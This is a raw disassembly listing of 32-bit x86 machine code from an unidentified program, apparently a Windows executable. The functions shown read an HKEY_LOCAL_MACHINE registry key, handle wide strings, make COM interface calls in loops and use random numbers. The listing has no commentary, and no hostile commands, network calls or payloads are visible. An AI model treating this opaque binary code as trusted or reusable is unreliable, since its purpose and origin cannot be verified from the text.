  408468:	83 cf ff             	or     $0xffffffff,%edi
  40846b:	ff 75 0c             	push   0xc(%ebp)
  40846e:	6a 00                	push   $0x0
  408470:	ff 75 08             	push   0x8(%ebp)
  408473:	ff 36                	push   (%esi)
  408475:	ff 15 08 e0 40 00    	call   *0x40e008
  40847b:	85 c0                	test   %eax,%eax
  40847d:	75 03                	jne    0x408482
  40847f:	8b 7d 14             	mov    0x14(%ebp),%edi
  408482:	ff 36                	push   (%esi)
  408484:	ff 15 14 e0 40 00    	call   *0x40e014
  40848a:	8b c7                	mov    %edi,%eax
  40848c:	5f                   	pop    %edi
  40848d:	5d                   	pop    %ebp
  40848e:	c3                   	ret
  40848f:	55                   	push   %ebp
  408490:	8b ec                	mov    %esp,%ebp
  408492:	51                   	push   %ecx
  408493:	51                   	push   %ecx
  408494:	53                   	push   %ebx
  408495:	56                   	push   %esi
  408496:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  408499:	51                   	push   %ecx
  40849a:	6a 01                	push   $0x1
  40849c:	6a 00                	push   $0x0
  40849e:	ff 75 08             	push   0x8(%ebp)
  4084a1:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4084a4:	50                   	push   %eax
  4084a5:	ff 15 00 e0 40 00    	call   *0x40e000
  4084ab:	85 c0                	test   %eax,%eax
  4084ad:	75 1d                	jne    0x4084cc
  4084af:	8b 45 10             	mov    0x10(%ebp),%eax
  4084b2:	03 c0                	add    %eax,%eax
  4084b4:	50                   	push   %eax
  4084b5:	57                   	push   %edi
  4084b6:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4084b9:	50                   	push   %eax
  4084ba:	ff 75 0c             	push   0xc(%ebp)
  4084bd:	8d 75 f8             	lea    -0x8(%ebp),%esi
  4084c0:	e8 98 ff ff ff       	call   0x40845d
  4084c5:	83 c4 10             	add    $0x10,%esp
  4084c8:	8b d8                	mov    %eax,%ebx
  4084ca:	eb 03                	jmp    0x4084cf
  4084cc:	83 cb ff             	or     $0xffffffff,%ebx
  4084cf:	83 fb ff             	cmp    $0xffffffff,%ebx
  4084d2:	74 71                	je     0x408545
  4084d4:	f6 c3 01             	test   $0x1,%bl
  4084d7:	75 6c                	jne    0x408545
  4084d9:	83 7d fc 01          	cmpl   $0x1,-0x4(%ebp)
  4084dd:	74 06                	je     0x4084e5
  4084df:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  4084e3:	75 60                	jne    0x408545
  4084e5:	33 c9                	xor    %ecx,%ecx
  4084e7:	3b d9                	cmp    %ecx,%ebx
  4084e9:	75 05                	jne    0x4084f0
  4084eb:	66 89 0f             	mov    %cx,(%edi)
  4084ee:	eb 51                	jmp    0x408541
  4084f0:	d1 eb                	shr    $1,%ebx
  4084f2:	4b                   	dec    %ebx
  4084f3:	8b c3                	mov    %ebx,%eax
  4084f5:	66 39 0c 47          	cmp    %cx,(%edi,%eax,2)
  4084f9:	74 0c                	je     0x408507
  4084fb:	40                   	inc    %eax
  4084fc:	39 45 10             	cmp    %eax,0x10(%ebp)
  4084ff:	76 44                	jbe    0x408545
  408501:	66 89 0c 47          	mov    %cx,(%edi,%eax,2)
  408505:	8b d8                	mov    %eax,%ebx
  408507:	83 f8 02             	cmp    $0x2,%eax
  40850a:	76 35                	jbe    0x408541
  40850c:	83 7d fc 02          	cmpl   $0x2,-0x4(%ebp)
  408510:	75 2f                	jne    0x408541
  408512:	57                   	push   %edi
  408513:	e8 b8 3a 00 00       	call   0x40bfd0
  408518:	8b f0                	mov    %eax,%esi
  40851a:	85 f6                	test   %esi,%esi
  40851c:	59                   	pop    %ecx
  40851d:	74 0f                	je     0x40852e
  40851f:	ff 75 10             	push   0x10(%ebp)
  408522:	57                   	push   %edi
  408523:	56                   	push   %esi
  408524:	ff 15 7c e0 40 00    	call   *0x40e07c
  40852a:	85 c0                	test   %eax,%eax
  40852c:	75 03                	jne    0x408531
  40852e:	83 cb ff             	or     $0xffffffff,%ebx
  408531:	56                   	push   %esi
  408532:	6a 00                	push   $0x0
  408534:	ff 15 d0 e0 40 00    	call   *0x40e0d0
  40853a:	50                   	push   %eax
  40853b:	ff 15 a8 e0 40 00    	call   *0x40e0a8
  408541:	8b c3                	mov    %ebx,%eax
  408543:	eb 03                	jmp    0x408548
  408545:	83 c8 ff             	or     $0xffffffff,%eax
  408548:	5e                   	pop    %esi
  408549:	5b                   	pop    %ebx
  40854a:	c9                   	leave
  40854b:	c3                   	ret
  40854c:	55                   	push   %ebp
  40854d:	8b ec                	mov    %esp,%ebp
  40854f:	83 ec 0c             	sub    $0xc,%esp
  408552:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408556:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  408559:	51                   	push   %ecx
  40855a:	6a 01                	push   $0x1
  40855c:	6a 00                	push   $0x0
  40855e:	ff 75 08             	push   0x8(%ebp)
  408561:	89 45 f8             	mov    %eax,-0x8(%ebp)
  408564:	50                   	push   %eax
  408565:	ff 15 00 e0 40 00    	call   *0x40e000
  40856b:	85 c0                	test   %eax,%eax
  40856d:	75 1c                	jne    0x40858b
  40856f:	56                   	push   %esi
  408570:	6a 04                	push   $0x4
  408572:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408575:	50                   	push   %eax
  408576:	8d 45 f4             	lea    -0xc(%ebp),%eax
  408579:	50                   	push   %eax
  40857a:	ff 75 0c             	push   0xc(%ebp)
  40857d:	8d 75 f8             	lea    -0x8(%ebp),%esi
  408580:	e8 d8 fe ff ff       	call   0x40845d
  408585:	83 c4 10             	add    $0x10,%esp
  408588:	5e                   	pop    %esi
  408589:	eb 03                	jmp    0x40858e
  40858b:	83 c8 ff             	or     $0xffffffff,%eax
  40858e:	83 f8 04             	cmp    $0x4,%eax
  408591:	75 05                	jne    0x408598
  408593:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  408596:	74 04                	je     0x40859c
  408598:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40859c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  40859f:	c9                   	leave
  4085a0:	c3                   	ret
  4085a1:	8b 44 24 04          	mov    0x4(%esp),%eax
  4085a5:	8b 54 24 08          	mov    0x8(%esp),%edx
  4085a9:	8a 4c 24 0c          	mov    0xc(%esp),%cl
  4085ad:	80 f9 40             	cmp    $0x40,%cl
  4085b0:	73 17                	jae    0x4085c9
  4085b2:	80 f9 20             	cmp    $0x20,%cl
  4085b5:	73 07                	jae    0x4085be
  4085b7:	0f ad d0             	shrd   %cl,%edx,%eax
  4085ba:	d3 ea                	shr    %cl,%edx
  4085bc:	eb 0f                	jmp    0x4085cd
  4085be:	8b c2                	mov    %edx,%eax
  4085c0:	33 d2                	xor    %edx,%edx
  4085c2:	80 e1 1f             	and    $0x1f,%cl
  4085c5:	d3 e8                	shr    %cl,%eax
  4085c7:	eb 04                	jmp    0x4085cd
  4085c9:	33 c0                	xor    %eax,%eax
  4085cb:	33 d2                	xor    %edx,%edx
  4085cd:	c2 0c 00             	ret    $0xc
  4085d0:	8b 44 24 08          	mov    0x8(%esp),%eax
  4085d4:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4085d8:	0b c8                	or     %eax,%ecx
  4085da:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  4085de:	75 09                	jne    0x4085e9
  4085e0:	8b 44 24 04          	mov    0x4(%esp),%eax
  4085e4:	f7 e1                	mul    %ecx
  4085e6:	c2 10 00             	ret    $0x10
  4085e9:	53                   	push   %ebx
  4085ea:	f7 e1                	mul    %ecx
  4085ec:	8b d8                	mov    %eax,%ebx
  4085ee:	8b 44 24 08          	mov    0x8(%esp),%eax
  4085f2:	f7 64 24 14          	mull   0x14(%esp)
  4085f6:	03 d8                	add    %eax,%ebx
  4085f8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4085fc:	f7 e1                	mul    %ecx
  4085fe:	03 d3                	add    %ebx,%edx
  408600:	5b                   	pop    %ebx
  408601:	c2 10 00             	ret    $0x10
  408604:	55                   	push   %ebp
  408605:	8b ec                	mov    %esp,%ebp
  408607:	81 ec 04 08 00 00    	sub    $0x804,%esp
  40860d:	53                   	push   %ebx
  40860e:	56                   	push   %esi
  40860f:	57                   	push   %edi
  408610:	8d 45 fc             	lea    -0x4(%ebp),%eax
  408613:	50                   	push   %eax
  408614:	6a 01                	push   $0x1
  408616:	33 f6                	xor    %esi,%esi
  408618:	56                   	push   %esi
  408619:	bb 50 ec 40 00       	mov    $0x40ec50,%ebx
  40861e:	53                   	push   %ebx
  40861f:	bf 02 00 00 80       	mov    $0x80000002,%edi
  408624:	57                   	push   %edi
  408625:	89 75 fc             	mov    %esi,-0x4(%ebp)
  408628:	ff 15 00 e0 40 00    	call   *0x40e000
  40862e:	85 c0                	test   %eax,%eax
  408630:	75 18                	jne    0x40864a
  408632:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  408638:	50                   	push   %eax
  408639:	68 bc ec 40 00       	push   $0x40ecbc
  40863e:	8d 75 fc             	lea    -0x4(%ebp),%esi
  408641:	e8 7a e3 ff ff       	call   0x4069c0
  408646:	59                   	pop    %ecx
  408647:	59                   	pop    %ecx
  408648:	8b f0                	mov    %eax,%esi
  40864a:	ff 15 64 e0 40 00    	call   *0x40e064
  408650:	85 f6                	test   %esi,%esi
  408652:	75 04                	jne    0x408658
  408654:	33 c0                	xor    %eax,%eax
  408656:	eb 35                	jmp    0x40868d
  408658:	8d 85 fc f7 ff ff    	lea    -0x804(%ebp),%eax
  40865e:	50                   	push   %eax
  40865f:	e8 ed cd ff ff       	call   0x405451
  408664:	83 f8 04             	cmp    $0x4,%eax
  408667:	59                   	pop    %ecx
  408668:	76 18                	jbe    0x408682
  40866a:	6a 01                	push   $0x1
  40866c:	68 48 ea 40 00       	push   $0x40ea48
  408671:	68 bc ec 40 00       	push   $0x40ecbc
  408676:	53                   	push   %ebx
  408677:	57                   	push   %edi
  408678:	e8 80 e3 ff ff       	call   0x4069fd
  40867d:	83 c4 14             	add    $0x14,%esp
  408680:	eb 0b                	jmp    0x40868d
  408682:	68 d8 ec 40 00       	push   $0x40ecd8
  408687:	ff 15 54 e0 40 00    	call   *0x40e054
  40868d:	5f                   	pop    %edi
  40868e:	5e                   	pop    %esi
  40868f:	5b                   	pop    %ebx
  408690:	c9                   	leave
  408691:	c3                   	ret
  408692:	55                   	push   %ebp
  408693:	8b ec                	mov    %esp,%ebp
  408695:	81 ec 20 08 00 00    	sub    $0x820,%esp
  40869b:	53                   	push   %ebx
  40869c:	56                   	push   %esi
  40869d:	33 f6                	xor    %esi,%esi
  40869f:	57                   	push   %edi
  4086a0:	ff 75 20             	push   0x20(%ebp)
  4086a3:	46                   	inc    %esi
  4086a4:	8b c6                	mov    %esi,%eax
  4086a6:	89 35 cc 7e 42 00    	mov    %esi,0x427ecc
  4086ac:	e8 b8 1d 00 00       	call   0x40a469
  4086b1:	85 c0                	test   %eax,%eax
  4086b3:	59                   	pop    %ecx
  4086b4:	75 08                	jne    0x4086be
  4086b6:	6a 06                	push   $0x6
  4086b8:	58                   	pop    %eax
  4086b9:	5f                   	pop    %edi
  4086ba:	5e                   	pop    %esi
  4086bb:	5b                   	pop    %ebx
  4086bc:	c9                   	leave
  4086bd:	c3                   	ret
  4086be:	8a 45 20             	mov    0x20(%ebp),%al
  4086c1:	e8 a3 1e 00 00       	call   0x40a569
  4086c6:	33 ff                	xor    %edi,%edi
  4086c8:	57                   	push   %edi
  4086c9:	ff 75 20             	push   0x20(%ebp)
  4086cc:	8b ce                	mov    %esi,%ecx
  4086ce:	ff 75 14             	push   0x14(%ebp)
  4086d1:	8b d8                	mov    %eax,%ebx
  4086d3:	ff 75 10             	push   0x10(%ebp)
  4086d6:	ff 75 08             	push   0x8(%ebp)
  4086d9:	e8 67 1c 00 00       	call   0x40a345
  4086de:	83 c4 14             	add    $0x14,%esp
  4086e1:	85 c0                	test   %eax,%eax
  4086e3:	75 13                	jne    0x4086f8
  4086e5:	6a 02                	push   $0x2
  4086e7:	5e                   	pop    %esi
  4086e8:	ff 75 20             	push   0x20(%ebp)
  4086eb:	33 c0                	xor    %eax,%eax
  4086ed:	40                   	inc    %eax
  4086ee:	e8 6b 1f 00 00       	call   0x40a65e
  4086f3:	59                   	pop    %ecx
  4086f4:	8b c6                	mov    %esi,%eax
  4086f6:	eb c1                	jmp    0x4086b9
  4086f8:	ff 75 18             	push   0x18(%ebp)
  4086fb:	8a 4d 1c             	mov    0x1c(%ebp),%cl
  4086fe:	e8 28 18 00 00       	call   0x409f2b
  408703:	8b 03                	mov    (%ebx),%eax
  408705:	59                   	pop    %ecx
  408706:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  408709:	51                   	push   %ecx
  40870a:	53                   	push   %ebx
  40870b:	ff 50 78             	call   *0x78(%eax)
  40870e:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408711:	68 cc e9 40 00       	push   $0x40e9cc
  408716:	8d b5 e4 f7 ff ff    	lea    -0x81c(%ebp),%esi
  40871c:	e8 72 cd ff ff       	call   0x405493
  408721:	3b c7                	cmp    %edi,%eax
  408723:	59                   	pop    %ecx
  408724:	66 89 bd e4 f7 ff ff 	mov    %di,-0x81c(%ebp)
  40872b:	74 1d                	je     0x40874a
  40872d:	83 c0 0e             	add    $0xe,%eax
  408730:	eb 0d                	jmp    0x40873f
  408732:	66 83 f9 2f          	cmp    $0x2f,%cx
  408736:	74 0f                	je     0x408747
  408738:	66 89 0e             	mov    %cx,(%esi)
  40873b:	46                   	inc    %esi
  40873c:	46                   	inc    %esi
  40873d:	40                   	inc    %eax
  40873e:	40                   	inc    %eax
  40873f:	0f b7 08             	movzwl (%eax),%ecx
  408742:	66 3b cf             	cmp    %di,%cx
  408745:	75 eb                	jne    0x408732
  408747:	66 89 3e             	mov    %di,(%esi)
  40874a:	8d 85 e4 f7 ff ff    	lea    -0x81c(%ebp),%eax
  408750:	50                   	push   %eax
  408751:	ff 15 44 e1 40 00    	call   *0x40e144
  408757:	ff 75 e8             	push   -0x18(%ebp)
  40875a:	ff 15 00 e1 40 00    	call   *0x40e100
  408760:	89 7d f4             	mov    %edi,-0xc(%ebp)
  408763:	89 7d ec             	mov    %edi,-0x14(%ebp)
  408766:	89 7d f8             	mov    %edi,-0x8(%ebp)
  408769:	89 7d f0             	mov    %edi,-0x10(%ebp)
  40876c:	8b 45 0c             	mov    0xc(%ebp),%eax
  40876f:	39 45 f4             	cmp    %eax,-0xc(%ebp)
  408772:	0f 8d 99 00 00 00    	jge    0x408811
  408778:	03 c0                	add    %eax,%eax
  40877a:	39 45 ec             	cmp    %eax,-0x14(%ebp)
  40877d:	0f 8d 8e 00 00 00    	jge    0x408811
  408783:	8d 85 e4 f7 ff ff    	lea    -0x81c(%ebp),%eax
  408789:	50                   	push   %eax
  40878a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40878d:	50                   	push   %eax
  40878e:	8b c3                	mov    %ebx,%eax
  408790:	e8 22 05 00 00       	call   0x408cb7
  408795:	59                   	pop    %ecx
  408796:	59                   	pop    %ecx
  408797:	8b f0                	mov    %eax,%esi
  408799:	e8 af d0 ff ff       	call   0x40584d
  40879e:	6a 64                	push   $0x64
  4087a0:	99                   	cltd
  4087a1:	59                   	pop    %ecx
  4087a2:	f7 f9                	idiv   %ecx
  4087a4:	39 7d f8             	cmp    %edi,-0x8(%ebp)
  4087a7:	7e 2e                	jle    0x4087d7
  4087a9:	3b f7                	cmp    %edi,%esi
  4087ab:	74 05                	je     0x4087b2
  4087ad:	83 fa 1e             	cmp    $0x1e,%edx
  4087b0:	7d 25                	jge    0x4087d7
  4087b2:	e8 96 d0 ff ff       	call   0x40584d
  4087b7:	99                   	cltd
  4087b8:	f7 7d f8             	idivl  -0x8(%ebp)
  4087bb:	42                   	inc    %edx
  4087bc:	3b d7                	cmp    %edi,%edx
  4087be:	7e 12                	jle    0x4087d2
  4087c0:	8b f2                	mov    %edx,%esi
  4087c2:	8b 03                	mov    (%ebx),%eax
  4087c4:	53                   	push   %ebx
  4087c5:	ff 50 1c             	call   *0x1c(%eax)
  4087c8:	85 c0                	test   %eax,%eax
  4087ca:	7c 03                	jl     0x4087cf
  4087cc:	ff 4d f8             	decl   -0x8(%ebp)
  4087cf:	4e                   	dec    %esi
  4087d0:	75 f0                	jne    0x4087c2
  4087d2:	33 f6                	xor    %esi,%esi
  4087d4:	46                   	inc    %esi
  4087d5:	eb 23                	jmp    0x4087fa
  4087d7:	3b f7                	cmp    %edi,%esi
  4087d9:	74 1f                	je     0x4087fa
  4087db:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4087de:	8b 08                	mov    (%eax),%ecx
  4087e0:	50                   	push   %eax
  4087e1:	ff 91 14 01 00 00    	call   *0x114(%ecx)
  4087e7:	85 c0                	test   %eax,%eax
  4087e9:	7d 09                	jge    0x4087f4
  4087eb:	c7 45 f0 03 00 00 00 	movl   $0x3,-0x10(%ebp)
  4087f2:	eb 03                	jmp    0x4087f7
  4087f4:	ff 45 f8             	incl   -0x8(%ebp)
  4087f7:	ff 45 f4             	incl   -0xc(%ebp)
  4087fa:	ff 75 18             	push   0x18(%ebp)
  4087fd:	8a 4d 1c             	mov    0x1c(%ebp),%cl
  408800:	ff 45 ec             	incl   -0x14(%ebp)
  408803:	e8 23 17 00 00       	call   0x409f2b
  408808:	3b f7                	cmp    %edi,%esi
  40880a:	59                   	pop    %ecx
  40880b:	0f 85 5b ff ff ff    	jne    0x40876c
  408811:	39 7d f4             	cmp    %edi,-0xc(%ebp)
  408814:	75 07                	jne    0x40881d
  408816:	c7 45 f0 04 00 00 00 	movl   $0x4,-0x10(%ebp)
  40881d:	8b 75 f0             	mov    -0x10(%ebp),%esi
  408820:	e9 c3 fe ff ff       	jmp    0x4086e8
  408825:	55                   	push   %ebp
  408826:	8b ec                	mov    %esp,%ebp
  408828:	b8 a0 20 00 00       	mov    $0x20a0,%eax
  40882d:	e8 7e 4d 00 00       	call   0x40d5b0
  408832:	53                   	push   %ebx
  408833:	33 db                	xor    %ebx,%ebx
  408835:	38 5d 1c             	cmp    %bl,0x1c(%ebp)
  408838:	56                   	push   %esi
  408839:	57                   	push   %edi
  40883a:	89 5d f0             	mov    %ebx,-0x10(%ebp)
  40883d:	75 0d                	jne    0x40884c
  40883f:	8a 45 18             	mov    0x18(%ebp),%al
  408842:	c7 45 f0 01 00 00 00 	movl   $0x1,-0x10(%ebp)
  408849:	88 45 1c             	mov    %al,0x1c(%ebp)
  40884c:	ff 75 20             	push   0x20(%ebp)
  40884f:	33 c0                	xor    %eax,%eax
  408851:	40                   	inc    %eax
  408852:	e8 12 1c 00 00       	call   0x40a469
  408857:	85 c0                	test   %eax,%eax
  408859:	59                   	pop    %ecx
  40885a:	75 08                	jne    0x408864
  40885c:	6a 06                	push   $0x6
  40885e:	58                   	pop    %eax
  40885f:	5f                   	pop    %edi
  408860:	5e                   	pop    %esi
  408861:	5b                   	pop    %ebx
  408862:	c9                   	leave
  408863:	c3                   	ret
  408864:	8a 45 20             	mov    0x20(%ebp),%al
  408867:	e8 fd 1c 00 00       	call   0x40a569
  40886c:	53                   	push   %ebx
  40886d:	ff 75 20             	push   0x20(%ebp)
  408870:	33 c9                	xor    %ecx,%ecx
  408872:	ff 75 14             	push   0x14(%ebp)
  408875:	41                   	inc    %ecx
  408876:	ff 75 10             	push   0x10(%ebp)
  408879:	8b f0                	mov    %eax,%esi
  40887b:	ff 75 08             	push   0x8(%ebp)
  40887e:	e8 c2 1a 00 00       	call   0x40a345
  408883:	83 c4 14             	add    $0x14,%esp
  408886:	85 c0                	test   %eax,%eax
  408888:	75 13                	jne    0x40889d
  40888a:	6a 02                	push   $0x2
  40888c:	5e                   	pop    %esi
  40888d:	ff 75 20             	push   0x20(%ebp)
  408890:	33 c0                	xor    %eax,%eax
  408892:	40                   	inc    %eax
  408893:	e8 c6 1d 00 00       	call   0x40a65e
  408898:	59                   	pop    %ecx
  408899:	8b c6                	mov    %esi,%eax
  40889b:	eb c2                	jmp    0x40885f
  40889d:	39 5d f0             	cmp    %ebx,-0x10(%ebp)
  4088a0:	8b 3d 00 e1 40 00    	mov    0x40e100,%edi
  4088a6:	74 43                	je     0x4088eb
  4088a8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4088ab:	50                   	push   %eax
  4088ac:	8b c6                	mov    %esi,%eax
  4088ae:	e8 f5 09 00 00       	call   0x4092a8
  4088b3:	8b 06                	mov    (%esi),%eax
  4088b5:	59                   	pop    %ecx
  4088b6:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4088b9:	51                   	push   %ecx
  4088ba:	56                   	push   %esi
  4088bb:	ff 50 78             	call   *0x78(%eax)
  4088be:	ff 75 f8             	push   -0x8(%ebp)
  4088c1:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4088c4:	8d 85 64 df ff ff    	lea    -0x209c(%ebp),%eax
  4088ca:	50                   	push   %eax
  4088cb:	e8 5f 08 00 00       	call   0x40912f
  4088d0:	8d 85 64 df ff ff    	lea    -0x209c(%ebp),%eax
  4088d6:	50                   	push   %eax
  4088d7:	8b c6                	mov    %esi,%eax
  4088d9:	e8 23 0a 00 00       	call   0x409301
  4088de:	83 c4 0c             	add    $0xc,%esp
  4088e1:	ff 75 f4             	push   -0xc(%ebp)
  4088e4:	ff d7                	call   *%edi
  4088e6:	ff 75 f8             	push   -0x8(%ebp)
  4088e9:	ff d7                	call   *%edi
  4088eb:	ff 75 18             	push   0x18(%ebp)
  4088ee:	8a 4d 1c             	mov    0x1c(%ebp),%cl
  4088f1:	e8 35 16 00 00       	call   0x409f2b
  4088f6:	59                   	pop    %ecx
  4088f7:	6a 28                	push   $0x28
  4088f9:	68 b6 94 40 00       	push   $0x4094b6
  4088fe:	ff 75 0c             	push   0xc(%ebp)
  408901:	8d 85 64 ff ff ff    	lea    -0x9c(%ebp),%eax
  408907:	50                   	push   %eax
  408908:	56                   	push   %esi
  408909:	8d 5d e8             	lea    -0x18(%ebp),%ebx
  40890c:	e8 ec 00 00 00       	call   0x4089fd
  408911:	83 c4 14             	add    $0x14,%esp
  408914:	85 c0                	test   %eax,%eax
  408916:	75 07                	jne    0x40891f
  408918:	6a 05                	push   $0x5
  40891a:	e9 6d ff ff ff       	jmp    0x40888c
  40891f:	8b 06                	mov    (%esi),%eax
  408921:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  408924:	51                   	push   %ecx
  408925:	56                   	push   %esi
  408926:	ff 50 78             	call   *0x78(%eax)
  408929:	33 f6                	xor    %esi,%esi
  40892b:	39 75 e8             	cmp    %esi,-0x18(%ebp)
  40892e:	89 75 ec             	mov    %esi,-0x14(%ebp)
  408931:	0f 8e b9 00 00 00    	jle    0x4089f0
  408937:	8b 5d 20             	mov    0x20(%ebp),%ebx
  40893a:	33 c0                	xor    %eax,%eax
  40893c:	53                   	push   %ebx
  40893d:	40                   	inc    %eax
  40893e:	e8 1b 1d 00 00       	call   0x40a65e
  408943:	59                   	pop    %ecx
  408944:	33 c0                	xor    %eax,%eax
  408946:	53                   	push   %ebx
  408947:	40                   	inc    %eax
  408948:	e8 1c 1b 00 00       	call   0x40a469
  40894d:	85 c0                	test   %eax,%eax
  40894f:	59                   	pop    %ecx
  408950:	75 0c                	jne    0x40895e
  408952:	c7 45 ec 03 00 00 00 	movl   $0x3,-0x14(%ebp)
  408959:	e9 88 00 00 00       	jmp    0x4089e6
  40895e:	8a c3                	mov    %bl,%al
  408960:	e8 04 1c 00 00       	call   0x40a569
  408965:	6a 00                	push   $0x0
  408967:	53                   	push   %ebx
  408968:	ff 75 14             	push   0x14(%ebp)
  40896b:	33 c9                	xor    %ecx,%ecx
  40896d:	ff 75 e4             	push   -0x1c(%ebp)
  408970:	41                   	inc    %ecx
  408971:	ff b4 b5 64 ff ff ff 	push   -0x9c(%ebp,%esi,4)
  408978:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40897b:	e8 c5 19 00 00       	call   0x40a345
  408980:	83 c4 14             	add    $0x14,%esp
  408983:	85 c0                	test   %eax,%eax
  408985:	75 07                	jne    0x40898e
  408987:	c7 45 ec 03 00 00 00 	movl   $0x3,-0x14(%ebp)
  40898e:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  408992:	74 46                	je     0x4089da
  408994:	8b 5d e0             	mov    -0x20(%ebp),%ebx
  408997:	8d 45 f4             	lea    -0xc(%ebp),%eax
  40899a:	50                   	push   %eax
  40899b:	8b c3                	mov    %ebx,%eax
  40899d:	e8 06 09 00 00       	call   0x4092a8
  4089a2:	8b 03                	mov    (%ebx),%eax
  4089a4:	59                   	pop    %ecx
  4089a5:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  4089a8:	51                   	push   %ecx
  4089a9:	53                   	push   %ebx
  4089aa:	ff 50 78             	call   *0x78(%eax)
  4089ad:	ff 75 f8             	push   -0x8(%ebp)
  4089b0:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4089b3:	8d 85 64 df ff ff    	lea    -0x209c(%ebp),%eax
  4089b9:	50                   	push   %eax
  4089ba:	e8 70 07 00 00       	call   0x40912f
  4089bf:	8d 85 64 df ff ff    	lea    -0x209c(%ebp),%eax
  4089c5:	50                   	push   %eax
  4089c6:	8b c3                	mov    %ebx,%eax
  4089c8:	e8 34 09 00 00       	call   0x409301
  4089cd:	83 c4 0c             	add    $0xc,%esp
  4089d0:	ff 75 f4             	push   -0xc(%ebp)
  4089d3:	ff d7                	call   *%edi
  4089d5:	ff 75 f8             	push   -0x8(%ebp)
  4089d8:	ff d7                	call   *%edi
  4089da:	ff 75 18             	push   0x18(%ebp)
  4089dd:	8a 4d 1c             	mov    0x1c(%ebp),%cl
  4089e0:	e8 46 15 00 00       	call   0x409f2b
  4089e5:	59                   	pop    %ecx
  4089e6:	46                   	inc    %esi
  4089e7:	3b 75 e8             	cmp    -0x18(%ebp),%esi
  4089ea:	0f 8c 47 ff ff ff    	jl     0x408937
  4089f0:	ff 75 e4             	push   -0x1c(%ebp)
  4089f3:	ff d7                	call   *%edi
  4089f5:	8b 75 ec             	mov    -0x14(%ebp),%esi
  4089f8:	e9 90 fe ff ff       	jmp    0x40888d
  4089fd:	55                   	push   %ebp
  4089fe:	8b ec                	mov    %esp,%ebp
  408a00:	81 ec cc 01 00 00    	sub    $0x1cc,%esp
  408a06:	8b 45 08             	mov    0x8(%ebp),%eax
  408a09:	8b 08                	mov    (%eax),%ecx
  408a0b:	56                   	push   %esi
  408a0c:	57                   	push   %edi
  408a0d:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408a10:	52                   	push   %edx
  408a11:	33 ff                	xor    %edi,%edi
  408a13:	50                   	push   %eax
  408a14:	89 7d f8             	mov    %edi,-0x8(%ebp)
  408a17:	ff 51 48             	call   *0x48(%ecx)
  408a1a:	85 c0                	test   %eax,%eax
  408a1c:	7d 07                	jge    0x408a25
  408a1e:	33 c0                	xor    %eax,%eax
  408a20:	e9 8e 02 00 00       	jmp    0x408cb3
  408a25:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408a28:	8b 08                	mov    (%eax),%ecx
  408a2a:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  408a2d:	52                   	push   %edx
  408a2e:	68 e8 e1 40 00       	push   $0x40e1e8
  408a33:	50                   	push   %eax
  408a34:	ff 11                	call   *(%ecx)
  408a36:	8b f0                	mov    %eax,%esi
  408a38:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408a3b:	8b 08                	mov    (%eax),%ecx
  408a3d:	50                   	push   %eax
  408a3e:	ff 51 08             	call   *0x8(%ecx)
  408a41:	3b f7                	cmp    %edi,%esi
  408a43:	7c d9                	jl     0x408a1e
  408a45:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  408a48:	8b 08                	mov    (%eax),%ecx
  408a4a:	8d 55 e4             	lea    -0x1c(%ebp),%edx
  408a4d:	52                   	push   %edx
  408a4e:	50                   	push   %eax
  408a4f:	ff 51 20             	call   *0x20(%ecx)
  408a52:	8b f0                	mov    %eax,%esi
  408a54:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  408a57:	8b 08                	mov    (%eax),%ecx
  408a59:	50                   	push   %eax
  408a5a:	ff 51 08             	call   *0x8(%ecx)
  408a5d:	3b f7                	cmp    %edi,%esi
  408a5f:	7c bd                	jl     0x408a1e
  408a61:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408a64:	8b 08                	mov    (%eax),%ecx
  408a66:	8d 55 dc             	lea    -0x24(%ebp),%edx
  408a69:	52                   	push   %edx
  408a6a:	50                   	push   %eax
  408a6b:	ff 51 24             	call   *0x24(%ecx)
  408a6e:	39 7d dc             	cmp    %edi,-0x24(%ebp)
  408a71:	89 7d e8             	mov    %edi,-0x18(%ebp)
  408a74:	7e a8                	jle    0x408a1e
  408a76:	8d 85 fc fe ff ff    	lea    -0x104(%ebp),%eax
  408a7c:	89 45 d8             	mov    %eax,-0x28(%ebp)
  408a7f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408a82:	3b 45 18             	cmp    0x18(%ebp),%eax
  408a85:	0f 8d 39 01 00 00    	jge    0x408bc4
  408a8b:	8b 45 e8             	mov    -0x18(%ebp),%eax
  408a8e:	89 45 cc             	mov    %eax,-0x34(%ebp)
  408a91:	66 c7 45 c4 16 00    	movw   $0x16,-0x3c(%ebp)
  408a97:	8d 55 f4             	lea    -0xc(%ebp),%edx
  408a9a:	52                   	push   %edx
  408a9b:	83 ec 10             	sub    $0x10,%esp
  408a9e:	8b fc                	mov    %esp,%edi
  408aa0:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408aa3:	8d 75 c4             	lea    -0x3c(%ebp),%esi
